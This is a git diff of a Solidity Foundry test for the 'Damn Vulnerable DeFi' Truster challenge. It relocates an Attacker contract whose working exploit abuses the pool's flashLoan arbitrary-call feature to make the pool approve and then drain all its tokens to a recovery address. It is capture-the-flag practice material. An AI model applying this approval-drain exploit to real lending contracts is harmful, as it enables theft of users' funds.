@@ -6,37 +6,6 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
-contract Attacker {
-    TrusterLenderPool private pool;
-    address private recovery;
-    DamnValuableToken private token;
-    uint256 private TOKENS_IN_POOL;
-
-    constructor(
-        TrusterLenderPool _pool,
-        address _recovery,
-        DamnValuableToken _token,
-        uint256 _TOKENS_IN_POOL
-    ) {
-        pool = _pool;
-        recovery = _recovery;
-        token = _token;
-        TOKENS_IN_POOL = _TOKENS_IN_POOL;
-    }
-
-    function attack() external {
-        bytes memory data = abi.encodeWithSignature(
-            "approve(address,uint256)",
-            address(this),
-            TOKENS_IN_POOL
-        );
-        pool.flashLoan(0, address(this), address(token), data);
-
-        
-        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
-    }
-}
-
 
 
 contract TrusterChallenge is Test {
@@ -84,7 +53,6 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        //NOTE (tina): Attacker contract is defined above this test contract
         Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
         attacker.attack();
 
@@ -106,5 +74,36 @@ contract TrusterChallenge is Test {
             TOKENS_IN_POOL,
             "Not enough tokens in recovery account"
         );
+    }
+}
+
+contract Attacker {
+    TrusterLenderPool private pool;
+    address private recovery;
+    DamnValuableToken private token;
+    uint256 private TOKENS_IN_POOL;
+
+    constructor(
+        TrusterLenderPool _pool,
+        address _recovery,
+        DamnValuableToken _token,
+        uint256 _TOKENS_IN_POOL
+    ) {
+        pool = _pool;
+        recovery = _recovery;
+        token = _token;
+        TOKENS_IN_POOL = _TOKENS_IN_POOL;
+    }
+
+    function attack() external {
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            TOKENS_IN_POOL
+        );
+        pool.flashLoan(0, address(this), address(token), data);
+
+
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
     }
 }
